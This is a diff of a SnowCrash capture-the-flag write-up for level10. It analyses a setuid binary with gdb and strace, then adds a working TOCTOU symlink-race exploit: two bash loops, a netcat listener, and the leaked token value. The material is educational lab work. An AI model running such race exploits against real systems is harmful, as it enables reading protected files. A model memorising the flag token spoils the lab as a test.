@@ -23,7 +23,7 @@ level10@SnowCrash:~$ ./level10
 	sends file to host if you have access to it
 ```
 
-Another thing is that we **CANNOT** run binary on a file we do not have the rights over:
+And we **CANNOT** run binary on a file we do not have the rights over:
 ```shell-session
 level10@SnowCrash:~$ ./level10 token localhost:6969
 You don't have access to token
@@ -98,10 +98,12 @@ Dump of assembler code for function main:
 ```
 
 We reduced output for clarity's sake, but the main information here is:
-1. the `socket` system call is used to establish connection to host
+1. the `socket` system call is used to establish connection to `host`
 2. the `access` system call is used to check rights before opening file
 
 #### strace
+
+Now to launch `strace` and assert precisely what are the parameters given to the system calls we identified with `gdb`.
 
 ```shell-session
 level10@SnowCrash:~$ strace ./level10 /tmp/test 127.0.0.1
@@ -126,18 +128,35 @@ write(1, "Connecting to 127.0.0.1:6969 .. ", 32Connecting to 127.0.0.1:6969 .. )
 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
 ```
 
-This gives us a clear idea of what are the parameters given to the system calls we identified with `gdb`.
+We see the calls to `access` and `socket`, lets focus on `socket`:
+
+```shell-session
+socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+```
+
+We see arguments:
+- `PF_INET`: which is a contants that determines networking details that are of no use to us right now:
+> AF_INET = Address Format, Internet = IP Addresses
+> PF_INET = Packet Format, Internet = IP, TCP/IP or UDP/IP
+> Meaning, AF_INET refers to addresses from the internet, IP addresses specifically.
+> PF_INET refers to anything in the protocol, usually sockets/ports.
+- Same for `IPPROTO_IP`:
+> The protocol specifies a particular protocol to be used with the socket. Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0.
+> [...]
+> This constant has the value 0. It's actually an automatic choice depending on socket type and family.
+- `SOCK_STREAM` though does help us further understanding the binary.
+
 
 ### reading manuals I
 
-`socket` takes a `SOCK_STEAM` and the [man](https://man7.org/linux/man-pages/man2/socket.2.html) for this type of port to port communication reads:
+`socket` takes a `SOCK_STREAM` and the [man](https://man7.org/linux/man-pages/man2/socket.2.html) for this type of port to port communication reads:
 
 >       SOCK_STREAM
 >             Provides sequenced, reliable, two-way, connection-based
 >             byte streams.  An out-of-band data transmission mechanism
 >             may be supported.
 
-The key word here is `two-way`, this must mean that if there is nobody listening the port the binary is trying to send the file to, then the system call fails.
+The key word here is `two-way`, this must mean that `if there is nobody listening the port the binary is trying to send the file to, then the system call fails.`
 
 **Progress.**
 
@@ -220,7 +239,129 @@ To put it clearly, if we:
 - give to the binary a symlink to a file we own so that `access` checks our access rights and returns "OK"
 - then change the destination to that link to a file we **DO NOT** own **BEFORE** `open` is called
 
+We will be able to see the contents of a file we don't own.
+
 ### exploit
 
+As we did in `level08`, we could try to trick the binary with symlinks.
+
+Meaning, pointing successively at a file we **do** own for the call to `access` to succeed, and then point to one we **do not** own for the call to `open`.
+
+Since we **cannot** reliably manually launch a script at the right moment **between** calls to `access` and `open`, we should try to make a script that does it for us.
+
+*Tasks that the script must do:*
+1. Create a `/tmp/outward` link, and a dummy path string to point to.
+2. Alternate between linking the dummy path and the targeted protected `token` file we are trying to send out.
+3. Repeatedly call the binary with the link and wait for the contents of `token` to leak on another terminal with `netcat` running
+
+Terminal 1:
+
+1. Make the script to loop linking
+
+```shell-session
+#!/bin/bash
+
+set -eu
+
+while true
+do
+  ln -sf /tmp/dummy /tmp/outward
+  ln -sf /home/user/level10/token /tmp/outward
+done
+echo "DONE."
+```
+
+2. Send it to the VM in `/tmp`
+
+```shell-session
+ λ snowcrash42/level10/Ressources scp -P 4242 loop_linking scp://level10@192.168.1.27//tmp/loop_linking
+	   _____                      _____               _
+	  / ____|                    / ____|             | |
+	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
+	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
+	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
+	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
+
+  Good luck & Have fun
+
+          192.168.1.27 2a01:cb08:18b:8b00:3560:55b:1aa8:44ee 2a01:cb08:18b:8b00:a00:27ff:fef7:2e52
+level10@192.168.1.27's password:
+loop_linking                                                 100%  132   321.0KB/s   00:00
+```
+
+3. Make the script to loop execution
+```shell-session
+#!/bin/bash
+
+set -eu
+
+while [ $? -ne 0 ]; do
+  ~/./level10 /tmp/outward $1
+done
+echo "EXECUTION LOOP DONE."
+```
+
+4. Send it to the VM in `/tmp`
+
+```shell-session
+ λ snowcrash42/level10/Ressources scp -P 4242 loop_execution scp://level10@192.168.1.27//tmp/loop_execution
+	   _____                      _____               _
+	  / ____|                    / ____|             | |
+	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
+	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
+	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
+	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
+
+  Good luck & Have fun
+
+          192.168.1.27 2a01:cb08:18b:8b00:3560:55b:1aa8:44ee 2a01:cb08:18b:8b00:a00:27ff:fef7:2e52
+level10@192.168.1.27's password:
+loop_execution                                               100%  108   340.1KB/s   00:00
+```
+
+Terminal 2:
+
+5. In the VM, give rights to both scripts and both files
+
+```shell-session
+level10@SnowCrash:/tmp$ touch dummy
+level10@SnowCrash:/tmp$ chmod 777 dummy loop_execution loop_linking
+```
+
+6. Run in the background the loop_linking
+
+```shell-sesion
+level10@SnowCrash:/tmp$ ./loop_linking &
+[1] 2522
+level10@SnowCrash:/tmp$ jobs
+[1]+  Running                 ./loop_linking &
+```
+
+Terminal 3:
+
+7. Launch `netcat` to continuously listen to port `6969 `
+
+```shell-session
+level10@SnowCrash:~$ nc -lk 6969
+$_[pending]
+```
+
+8. Launch loop_execution
+
+Terminal 2:
+
+```shell-session
+level10@SnowCrash:/tmp$ ./loop_execution "127.0.0.1"
+Connecting to 127.0.0.1:6969 .. Connected!
+Sending file .. wrote file!
+```
+
+Terminal 3 :
+
+9. See the contents of `token` file. 
+```shell-session
+level10@SnowCrash:~$ nc -lk 6969
+s5cAJpM8ev6XHw998pRWG728z.*( )*.
+```
 
 ## getflag
